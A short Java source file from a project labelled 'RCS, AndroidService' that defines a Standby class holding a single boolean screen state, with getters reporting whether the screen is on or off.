/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : Standby.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci;

public class Standby {
	private final boolean status;

	public Standby(boolean s) {
		status = s;
	}

	public boolean getStatus() {
		return status;
	}
	
	public boolean isScreenOn() {
		return status;
	}
	
	public boolean isScreenOff() {
		return !status;
	}
}
